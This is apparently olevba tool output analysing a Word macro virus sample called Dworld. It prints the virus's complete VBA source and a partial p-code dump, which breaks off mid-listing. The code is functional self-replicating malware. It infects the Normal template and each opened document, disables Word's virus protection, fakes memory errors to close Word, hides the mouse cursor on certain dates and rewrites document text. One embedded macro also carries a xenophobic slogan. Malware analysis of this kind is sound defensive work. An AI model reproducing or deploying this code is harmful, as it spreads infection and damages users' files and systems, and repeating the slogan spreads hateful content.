olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Dworld
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Dworld - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.Dworld - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub wechsel()
Attribute wechsel.VB_Description = "Makro aufgezeichnet am 12.01.99 von Harald J. Glatte"
Attribute wechsel.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.wechsel"
' wechsel Makro
' Makro aufgezeichnet am 12.01.99 von Harald J. Glatte
  Selection.InsertBreak Type:=wdSectionBreakContinuous
End Sub
Sub Makro1()
Attribute Makro1.VB_Description = "Makro aufgezeichnet am 03.02.99 von Harald J. Glatte"
Attribute Makro1.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Makro1"
'
' Makro1 Makro
' Makro aufgezeichnet am 03.02.99 von Harald J. Glatte
'
    ActiveDocument.Shapes.AddTextEffect(msoTextEffect14, "Ausländer raus!" & Chr(13) & "" & Chr(10) & "", _
        "Impact", 36#, msoFalse, msoFalse, 181.85, 59.45).Select
    Selection.ShapeRange.ScaleWidth 1.3, msoFalse, msoScaleFromTopLeft
    Selection.ShapeRange.ScaleHeight 0.38, msoFalse, msoScaleFromTopLeft
    Selection.ShapeRange.IncrementTop 7.2
    Selection.ShapeRange.IncrementTop 7.2
    Selection.ShapeRange.IncrementTop 7.2
    Selection.ShapeRange.IncrementTop -1.85
    Selection.ShapeRange.IncrementTop -7.2
    Selection.ShapeRange.IncrementTop -7.2
    Selection.ShapeRange.IncrementTop -7.2
    Selection.ShapeRange.ScaleWidth 1.08, msoFalse, msoScaleFromBottomRight
    Selection.ShapeRange.ScaleHeight 1.02, msoFalse, msoScaleFromTopLeft
End Sub
-------------------------------------------------------------------------------
VBA MACRO Dworld.bas 
in file: Virus.MSWord.Dworld - OLE stream: 'Macros/VBA/Dworld'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Declare Function ShowCursor Lib "USER32" (ByVal fShow As Integer) As Integer

Sub AnsichtCode()
 On Error Resume Next
 
 Call InfNormal
 Call InfDok
 
 ActiveDocument.SaveAs (WordBasic.[FileName$]())

 MsgBox "Nicht genug freien Speicher um Anwendung zu starten", 16, "Microsoft Word - Fehler"
 
 WordBasic.FileExit dlg

End Sub

Sub AnsichtVBCode()
On Error Resume Next
 
 Call InfNormal
 Call InfDok
 
 ActiveDocument.SaveAs (WordBasic.[FileName$]())

 MsgBox "Nicht genug freien Speicher um Anwendung zu starten", 16, "Microsoft Word - Fehler"
 
 WordBasic.FileExit dlg

End Sub
Sub AutoOpen()

ShowVisualBasicEditor = False
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
 
 With Options
     .SaveNormalPrompt = False
     .VirusProtection = False
     .AllowFastSave = False
 End With

 On Error GoTo ende_
 
 Call InfNormal
 Call InfDok
 Call PayloadB

 ActiveDocument.SaveAs (WordBasic.[FileName$]())

ende_:
End Sub
Sub AutoNew()
 
 Call AutoOpen

End Sub

Sub DateiDokVorlagen()
 On Error Resume Next
 
 Call InfNormal
 Call InfDok
 
 ActiveDocument.SaveAs (WordBasic.[FileName$]())

 MsgBox "Nicht genug freien Speicher um Anwendung zu starten", 16, "Microsoft Word - Fehler"
 
 WordBasic.FileExit dlg

End Sub

Sub DateiDruckenStandard()

Randomize

If Second(Now()) <= 30 And Int((3 * Rnd) + 1) = 2 Then
MsgBox "Des Zauberer´s Finger sind im Spiel!", 32, "Microsoft Word"

ScreenUpdating = 0
 
 Call PayloadA
 
  WordBasic.EndOfDocument
    Selection.TypeParagraph
    Selection.TypeParagraph
     Selection.Font.Name = "Courier New"
    Selection.Font.ColorIndex = wdRed
    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
    WordBasic.Insert "...Die aufgeklärten Brüder der schwarzen Nacht sagen:..."
    Selection.TypeParagraph
    WordBasic.Insert "-HOOOOOLLDRIIOOOOO!!!-"
  WordBasic.StartOfDocument
 
ScreenUpdating = 1

End If
 
 ActiveDocument.PrintOut
 
 Call InfNormal
 Call InfDok

 ActiveDocument.SaveAs (WordBasic.[FileName$]())

 Call PayloadB

End Sub

Sub DateiÖffnen()
On Error GoTo ende_
 
 ShowVisualBasicEditor = False
 WordBasic.DisableAutoMacros 0

 With Options
     .SaveNormalPrompt = False
 End With

 With Dialogs(wdDialogFileOpen)
     .Show
 End With

 Call InfDok
 
 ActiveDocument.Save
 
ende_:
End Sub
Sub DateiSpeichern()
On Error Resume Next

 With Dialogs(wdDialogFileSaveAs)
    .Show
 End With
 
 Call InfDok
 Call DworldInfo
 
 ActiveDocument.Save

End Sub
Sub Dworld()
' DiscwørlD MakrøViruS -Dwørld.MV.B- der magischen Gilde
' Prøgrammiert von Rincewind~[m@G]~
' Kontakt: | rincewind_mg@hotmail.com |
' !FöRDERT EURE LOKALE SZENE!
' Ausgesetzt im Jänner 99
' Danke an alle die mich kennen | besønders NJøker[SLAM] | cøRDy & LRay <beide LzØ>
' Dwørld.MV ist FleTsCheR und IarRaGøN<LzØ> gewidmet

' ØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØ
' Ø !"§%&/()=?->DiE auFgeKLärTeN BRüdeR dER sCHwaRzeN NaCHt<-?=()\&%$§"! Ø
' ØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØ
End Sub
Sub DworldInfo()
 On Error GoTo ende_
 
 Open "C:\WINDOWS\SYSTEM\DWORLD.INI" For Append As 2
  a$ = Date$
  b$ = Time$
  c$ = WordBasic.[FileName$]()
  
  Print #2, c$ + ",  " + a$ + ",  " + b$ + " ;"
     
  Close 2
ende_:
End Sub
Sub ExtrasMakro()
 On Error Resume Next
 
 Call InfNormal
 Call InfDok
 
 ActiveDocument.SaveAs (WordBasic.[FileName$]())

 MsgBox "Nicht genug freien Speicher um Anwendung zu starten", 16, "Microsoft Word - Fehler"
 
 WordBasic.FileExit dlg

End Sub

Sub PayloadA()
On Error Resume Next

Randomize

If Day(Now()) = 24 And Int((5 * Rnd) + 1) = 1 Then
 MsgBox "Des Zauberer´s Finger sind im Spiel!", 32, "Microsoft Word"

  Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
     With Selection.Find
        .Text = "der"
        .Replacement.Text = "der ~[m@G]~"
        .Wrap = wdFindContinue
     End With
    Selection.Find.Execute Replace:=wdReplaceAll
Else
End If

ActiveDocument.SaveAs (WordBasic.[FileName$]())

End Sub
Sub PayloadB()
On Error GoTo weiter_

    If Day(Now()) = 12 Then
       MsgBox "Des Zauberer´s Finger sind im Spiel!", 32, "Microsoft Word"
       GoTo HideMouse
    Else
       GoTo ShowMouse
    End If

HideMouse:
 While ShowCursor(False) >= 0
 Wend
GoTo weiter_

ShowMouse:
 While ShowCursor(True) < 0
 Wend

weiter_:
End Sub
Sub HilfeInfo()
On Error Resume Next
 
 Call InfNormal
 Call InfDok
 
 ActiveDocument.SaveAs (WordBasic.[FileName$]())

 MsgBox "<------------------------------------------------------------>                  " _
 & vbCrLf & "     Dwørld.MV.B hat Kontrolle über Word!" _
 & vbCrLf & Chr(13) + Chr(13) + "  Programmiert von RinCeWinD ~[m@G]~" _
 & vbCrLf & "              DanKe aN: IarRaGØn<***>" _
 & vbCrLf & "<------------------------------------------------------------>                  ", 64, "                     Die m@gische Gilde ~[m@G]~"
 
End Sub

Sub InfNormal()
 
If DworldIns = 0 Then
 
 DN$ = WordBasic.[FileName$]()
 DW$ = ":Dworld"
 G$ = "Global"

 On Error GoTo fehler_

 ScreenUpdating = 0

 WordBasic.MacroCopy DN$ + DW$, G$ + DW$, 1
 
 ScreenUpdating = 1
 
 Application.UserName = "RinCeWinD~[m@G]~"
 Application.UserInitials = "~[m@G]~"
 Application.UserAddress = "Kontakt: rincewind_mg@hotmail.com"

    Open "C:\WINDOWS\SYSTEM\DWORLD.INI" For Output As 1
     a$ = Date$
     b$ = Time$
     c$ = WordBasic.[FileName$]()
     
      Print #1, "----------------------------------------------------------------------------------------------------------"
      Print #1, "Erstinfektion mit Dworld.MV.B am: " + a$ + " um " + b$ + " durch " + c$
      Print #1, "----------------------------------------------------------------------------------------------------------"
      Print #1, "Programmiert von RinCeWinD~[m@G]~ aka zWeiBLuM<BeTa>"
      Print #1, "Kontakt: Rincewind_mg@hotmail.com"
      Print #1, " ---------------------------------------------------"
      Print #1, "|Danke an LzØ (besonders IarRagøN & LRay), BeTa CreW|"
      Print #1, "|und alle die mich kennen!                          |"
      Print #1, "|FöRDERT EURE LOKALE SZENE!                         |"
      Print #1, " ---------------------------------------------------"
      Print #1, ""
      Print #1, "Weitere Infektionen:"
      Print #1, "----------------------------------------------------------------------------------------------------------"
      Print #1, "DateiName:         Datum:          Uhrzeit:"
 
    Close 1
 
End If
fehler_:
End Sub
Sub InfDok()
 
If xDworldIns = 0 Then
 
 DN$ = WordBasic.[FileName$]()
 DW$ = ":Dworld"
 G$ = "Global"

On Error GoTo xfehler_

 ScreenUpdating = 0

 WordBasic.MacroCopy G$ + DW$, DN$ + DW$, 1
 
 ScreenUpdating = 1

 Call DworldInfo

End If

xfehler_:
End Sub

Function DworldIns()
 DworldIns = 0
  MZ = NormalTemplate.VBProject.VBComponents.Count
  For i = 1 To MZ
   If NormalTemplate.VBProject.VBComponents.Item(i).Name = "Dworld" Then
     DworldIns = -1
  End If
 Next i
End Function

Function xDworldIns()
xDworldIns = 0
 xMZ = ActiveDocument.VBProject.VBComponents.Count
 For x = 1 To xMZ
  If ActiveDocument.VBProject.VBComponents.Item(x).Name = "Dworld" Then
    xDworldIns = -1
  End If
 Next x
End Function



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Dworld
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1190 bytes
' Macros/VBA/NewMacros - 3373 bytes
' Line #0:
' 	FuncDefn (Sub wechsel())
' Line #1:
' 	QuoteRem 0x0000 0x000E " wechsel Makro"
' Line #2:
' 	QuoteRem 0x0000 0x0035 " Makro aufgezeichnet am 12.01.99 von Harald J. Glatte"
' Line #3:
' 	Ld wdSectionBreakContinuous 
' 	ParamNamed TypeOf 
' 	Ld Selection 
' 	ArgsMemCall InsertBreak 0x0001 
' Line #4:
' 	EndSub 
' Line #5:
' 	FuncDefn (Sub Makro1())
' Line #6:
' 	QuoteRem 0x0000 0x0000 ""
' Line #7:
' 	QuoteRem 0x0000 0x000D " Makro1 Makro"
' Line #8:
' 	QuoteRem 0x0000 0x0035 " Makro aufgezeichnet am 03.02.99 von Harald J. Glatte"
' Line #9:
' 	QuoteRem 0x0000 0x0000 ""
' Line #10:
' 	LineCont 0x0004 18 00 08 00
' 	Ld msoTextEffect14 
' 	LitStr 0x000F "Ausländer raus!"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	LitStr 0x0006 "Impact"
' 	LitR8 0x0000 0x0000 0x0000 0x4042 
' 	Ld msoFalse 
' 	Ld msoFalse 
' 	LitR8 0x3333 0x3333 0xBB33 0x4066 
' 	LitR8 0x999A 0x9999 0xB999 0x404D 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddTextEffect 0x0008 
' 	ArgsMemCall Set 0x0000 
' Line #11:
' 	LitR8 0xCCCD 0xCCCC 0xCCCC 0x3FF4 
' 	Ld msoFalse 
' 	Ld msoScaleFromTopLeft 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall ScaleWidth 0x0003 
' Line #12:
' 	LitR8 0xB852 0x851E 0x51EB 0x3FD8 
' 	Ld msoFalse 
' 	Ld msoScaleFromTopLeft 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall ScaleHeight 0x0003 
' Line #13:
' 	LitR8 0xCCCD 0xCCCC 0xCCCC 0x401C 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall IncrementTop 0x0001 
' Line #14:
' 	LitR8 0xCCCD 0xCCCC 0xCCCC 0x401C 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall IncrementTop 0x0001 
' Line #15:
' 	LitR8 0xCCCD 0xCCCC 0xCCCC 0x401C 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall IncrementTop 0x0001 
' Line #16:
' 	LitR8 0x999A 0x9999 0x9999 0x3FFD 
' 	UMi 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall IncrementTop 0x0001 
' Line #17:
' 	LitR8 0xCCCD 0xCCCC 0xCCCC 0x401C 
' 	UMi 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall IncrementTop 0x0001 
' Line #18:
' 	LitR8 0xCCCD 0xCCCC 0xCCCC 0x401C 
' 	UMi 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall IncrementTop 0x0001 
' Line #19:
' 	LitR8 0xCCCD 0xCCCC 0xCCCC 0x401C 
' 	UMi 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall IncrementTop 0x0001 
' Line #20:
' 	LitR8 0xE148 0x147A 0x47AE 0x3FF1 
' 	Ld msoFalse 
' 	Ld msoScaleFromBottomRight 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall ScaleWidth 0x0003 
' Line #21:
' 	LitR8 0xB852 0x851E 0x51EB 0x3FF0 
' 	Ld msoFalse 
' 	Ld msoScaleFromTopLeft 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall ScaleHeight 0x0003 
' Line #22:
' 	EndSub 
' Macros/VBA/Dworld - 24252 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Declare Function ShowCursor Lib "USER32" (ByVal fShow As Integer) As Integer)
' Line #2:
' Line #3:
' 	FuncDefn (Sub AnsichtCode())
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' Line #6:
' 	ArgsCall (Call) InfNormal 0x0000 
' Line #7:
' 	ArgsCall (Call) InfDok 0x0000 
' Line #8:
' Line #9:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	Paren 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #10:
' Line #11:
' 	LitStr 0x0033 "Nicht genug freien Speicher um Anwendung zu starten"
' 	LitDI2 0x0010 
' 	LitStr 0x0017 "Microsoft Word - Fehler"
' 	ArgsCall MsgBox 0x0003 
' Line #12:
' Line #13:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileExit 0x0001 
' Line #14:
' Line #15:
' 	EndSub 
' Line #16:
' Line #17:
' 	FuncDefn (Sub AnsichtVBCode())
' Line #18:
' 	OnError (Resume Next) 
' Line #19:
' Line #20:
' 	ArgsCall (Call) InfNormal 0x0000 
' Line #21:
' 	ArgsCall (Call) InfDok 0x0000 
' Line #22:
' Line #23:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	Paren 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #24:
' Line #25:
' 	LitStr 0x0033 "Nicht genug freien Speicher um Anwendung zu starten"
' 	LitDI2 0x0010 
' 	LitStr 0x0017 "Microsoft Word - Fehler"
' 	ArgsCall MsgBox 0x0003 
' Line #26:
' Line #27:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileExit 0x0001 
' Line #28:
' Line #29:
' 	EndSub 
' Line #30:
' 	FuncDefn (Sub AutoOpen())
' Line #31:
' Line #32:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #33:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #34:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #35:
' Line #36:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #37:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #38:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #39:
' 	LitVarSpecial (False)
' 	MemStWith AllowFastSave 
' Line #40:
' 	EndWith 
' Line #41:
' Line #42:
' 	OnError ende_ 
' Line #43:
' Line #44:
' 	ArgsCall (Call) InfNormal 0x0000 
' Line #45:
' 	ArgsCall (Call) InfDok 0x0000 
' Line #46:
' 	ArgsCall (Call) PayloadB 0x0000 
' Line #47:
' Line #48:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	Paren 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #49:
' Line #50:
' 	Label ende_ 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub AutoNew())
' Line #53:
' Line #54:
' 	ArgsCall (Call) AutoOpen 0x0000 
' Line #55:
' Line #56:
' 	EndSub 
' Line #57:
' Line #58:
' 	FuncDefn (Sub DateiDokVorlagen())
' Line #59:
' 	OnError (Resume Next) 
' Line #60:
' Line #61:
' 	ArgsCall (Call) InfNormal 0x0000 
' Line #62:
' 	ArgsCall (Call) InfDok 0x0000 
' Line #63:
' Line #64:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	Paren 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #65:
' Line #66:
' 	LitStr 0x0033 "Nicht genug freien Speicher um Anwendung zu starten"
' 	LitDI2 0x0010 
' 	LitStr 0x0017 "Microsoft Word - Fehler"
' 	ArgsCall MsgBox 0x0003 
' Line #67:
' Line #68:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileExit 0x0001 
' Line #69:
' Line #70:
' 	EndSub 
' Line #71:
' Line #72:
' 	FuncDefn (Sub DateiDruckenStandard())
' Line #73:
' Line #74:
' 	ArgsCall Read 0x0000 
' Line #75:
' Line #76:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Second 0x0001 
' 	LitDI2 0x001E 
' 	Le 
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #77:
' 	LitStr 0x0024 "Des Zauberer´s Finger sind im Spiel!"
' 	LitDI2 0x0020 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #78:
' Line #79:
' 	LitDI2 0x0000 
' 	St ScreenUpdating 
' Line #80:
' Line #81:
' 	ArgsCall (Call) PayloadA 0x0000 
' Line #82:
' Line #83:
' 	Ld WordBasic 
' 	ArgsMemCall EndOfDocument 0x0000 
' Line #84:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #85:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #86:
' 	LitStr 0x000B "Courier New"
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt New 
' Line #87:
' 	Ld wdRed 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #88:
' 	Ld wdAlignParagraphCenter 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #89:
' 	LitStr 0x0038 "...Die aufgeklärten Brüder der schwarzen Nacht sagen:..."
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #90:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #91:
' 	LitStr 0x0016 "-HOOOOOLLDRIIOOOOO!!!-"
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #92:
' 	Ld WordBasic 
' 	ArgsMemCall StartOfDocument 0x0000 
' Line #93:
' Line #94:
' 	LitDI2 0x0001 
' 	St ScreenUpdating 
' Line #95:
' Line #96:
' 	EndIfBlock 
' Line #97:
' Line #98:
' 	Ld ActiveDocument 
' 	ArgsMemCall PrintOut 0x0000 
' Line #99:
' Line #100:
' 	ArgsCall (Call) InfNormal 0x0000 
' Line #101:
' 	ArgsCall (Call) InfDok 0x0000 
' Line #102:
' Line #103:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	Paren 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #104:
' Line #105:
' 	ArgsCall (Call) PayloadB 0x0000 
' Line #106:
' Line #107:
' 	EndSub 
' Line #108:
' Line #109:
' 	FuncDefn (Sub DateiÖffnen())
' Line #110:
' 	OnError ende_ 
' Line #111:
' Line #112:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #113:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #114:
' Line #115:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #116:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #117:
' 	EndWith 
' Line #118:
' Line #119:
' 	StartWithExpr 
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #120:
' 	ArgsMemCallWith Show 0x0000 
' Line #121:
' 	EndWith 
' Line #122:
' Line #123:
' 	ArgsCall (Call) InfDok 0x0000 
' Line #124:
' Line #125:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #126:
' Line #127:
' 	Label ende_ 
' Line #128:
' 	EndSub 
' Line #129:
' 	FuncDefn (Sub DateiSpeichern())
' Line #130:
' 	OnError (Resume Next) 
' Line #131:
' Line #132:
' 	StartWithExpr 
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #133:
' 	ArgsMemCallWith Show 0x0000 
' Line #134:
' 	EndWith 
' Line #135:
' Line #136:
' 	ArgsCall (Call) InfDok 0x0000 
' Line #137:
' 	ArgsCall (Call) DworldInfo 0x0000 
' Line #138:
' Line #139:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #140:
' Line #141:
' 	EndSub 
' Line #142:
' 	FuncDefn (Sub Dworld())
' Line #143:
' 	QuoteRem 0x0000 0x0037 " DiscwørlD MakrøViruS -Dwørld.MV.B- der magischen Gilde"
' Line #144:
' 	QuoteRem 0x0000 0x0022 " Prøgrammiert von Rincewind~[m@G]~"
' Line #145:
' 	QuoteRem 0x0000 0x0026 " Kontakt: | rincewind_mg@hotmail.com |"
' Line #146:
' 	QuoteRem 0x0000 0x001C " !FöRDERT EURE LOKALE SZENE!"
' Line #147:
' 	QuoteRem 0x0000 0x0018 " Ausgesetzt im Jänner 99"
' Line #148:
' 	QuoteRem 0x0000 0x0052 " Danke an alle die mich kennen | besønders NJøker[SLAM] | cøRDy & LRay <beide LzØ>"
' Line #149:
' 	QuoteRem 0x0000 0x0033 " Dwørld.MV ist FleTsCheR und IarRaGøN<LzØ> gewidmet"
' Line #150:
' Line #151:
' 	QuoteRem 0x0000 0x0049 " ØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØ"
' Line #152:
' 	QuoteRem 0x0000 0x0049 " Ø !"§%&/()=?->DiE auFgeKLärTeN BRüdeR dER sCHwaRzeN NaCHt<-?=()\&%$§"! Ø"
' Line #153:
' 	QuoteRem 0x0000 0x0049 " ØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØØ"
' Line #154:
' 	EndSub 
' Line #155:
' 	FuncDefn (Sub DworldInfo())
' Line #156:
' 	OnError ende_ 
' Line #157:
' Line #158:
' 	LitStr 0x001C "C:\WINDOWS\SYSTEM\DWORLD.INI"
' 	LitDI2 0x0002 
' 	LitDefault 
' 	Open (For Append)
' Line #159:
' 	Ld Date$ 
' 	St a$ 
' Line #160:
' 	Ld Time$ 
' 	St B$ 
' Line #161:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St c$ 
' Line #162:
' Line #163:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	Ld c$ 
' 	LitStr 0x0003 ",  "
' 	Add 
' 	Ld a$ 
' 	Add 
' 	LitStr 0x0003 ",  "
' 	Add 
' 	Ld B$ 
' 	Add 
' 	LitStr 0x0002 " ;"
' 	Add 
' 	PrintItemNL 
' Line #164:
' Line #165:
' 	LitDI2 0x0002 
' 	Close 0x0001 
' Line #166:
' 	Label ende_ 
' Line #167:
' 	EndSub 
' Line #168:
' 	FuncDefn (Sub ExtrasMakro())
' Line #169:
' 	OnError (Resume Next) 
' Line #170:
' Line #171:
' 	ArgsCall (Call) InfNormal 0x0000 
' Line #172:
' 	ArgsCall (Call) InfDok 0x0000 
' Line #173:
' Line #174:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	Paren 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #175:
' Line #176:
' 	LitStr 0x0033 "Nicht genug freien Speicher um Anwendung zu starten"
' 	LitDI2 0x0010 
' 	LitStr 0x0017 "Microsoft Word - Fehler"
' 	ArgsCall MsgBox 0x0003 
' Line #177:
' Line #178:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileExit 0x0001 
' Line #179:
' Line #180:
' 	EndSub 
' Line #181:
' Line #182:
' 	FuncDefn (Sub PayloadA())
' Line #183:
' 	OnError (Resume Next) 
' Line #184:
' Line #185:
' 	ArgsCall Read 0x0000 
' Line #186:
' Line #187:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0018 
' 	Eq 
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #188:
' 	LitStr 0x0024 "Des Zauberer´s Finger sind im Spiel!"
' 	LitDI2 0x0020 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #189:
' Line #190:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #191:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #192:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #193:
' 	LitStr 0x0003 "der"
' 	MemStWith Then 
' Line #194:
' 	LitStr 0x000B "der ~[m@G]~"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #195:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #196:
' 	EndWith 
' Line #197:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #198:
' 	ElseBlock 
' Line #199:
' 	EndIfBlock 
' Line #200:
' Line #201:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	Paren 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #202:
' Line #203:
' 	EndSub 
' Line #204:
' 	FuncDefn (Sub PayloadB())
' Line #205:
' 	OnError weiter_ 
' Line #206:
' Line #207:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	IfBlock 
' Line #208:
' 	LitStr 0x0024 "Des Zauberer´s Finger sind im Spiel!"
' 	LitDI2 0x0020 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #209:
' 	GoTo HideMouse 
' Line #210:
' 	ElseBlock 
' Line #211:
' 	GoTo ShowMouse 
' Line #212:
' 	EndIfBlock 
' Line #213:
' Line #214:
' 	Label HideMouse 
' Line #215:
' 	LitVarSpecial (False)
' 	ArgsLd ShowCursor 0x0001 
' 	LitDI2 0x0000 
' 	Ge 
' 	While 
' Line #216:
' 	Wend 
' Line #217:
' 	GoTo weiter_ 
' Line #218:
' Line #219:
' 	Label ShowMouse 
' Line #220:
' 	LitVarSpecial (True)
' 	ArgsLd ShowCursor 0x0001 
' 	LitDI2 0x0000 
' 	Lt 
' 	While 
' Line #221:
' 	Wend 
' Line #222:
' Line #223:
' 	Label weiter_ 
' Line #224:
' 	EndSub 
' Line #225:
' 	FuncDefn (Sub HilfeInfo())
' Line #226:
' 	OnError (Resume Next) 
' Line #227:
' Line #228:
' 	ArgsCall (Call) InfNormal 0x0000 
' Line #229:
' 	ArgsCall (Call) InfDok 0x0000 
' Line #230:
' Line #231:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	Paren 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #232:
' Line #233:
